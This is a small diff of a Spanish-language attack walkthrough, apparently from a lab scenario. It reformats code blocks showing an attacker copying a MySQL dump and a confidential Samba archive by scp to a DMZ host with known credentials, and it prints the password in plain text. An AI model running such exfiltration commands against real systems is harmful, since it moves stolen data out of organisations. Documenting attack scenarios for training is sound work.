@@ -517,9 +517,11 @@ El atacante usa las credenciales ya conocidas para transferir los archivos al `d
 ```bash
 # Transferir el dump de MySQL a la DMZ
 scp /tmp/corporativedb.sql ftpoperator@192.168.57.10:/tmp/
+```
 
-#contraseña: ftpoperator
+contraseña: ftpoperator
 
+```bash
 # Transferir el archivo comprimido de Samba a la DMZ
 scp /tmp/confidential.tar.gz ftpoperator@192.168.57.10:/tmp/
 ```
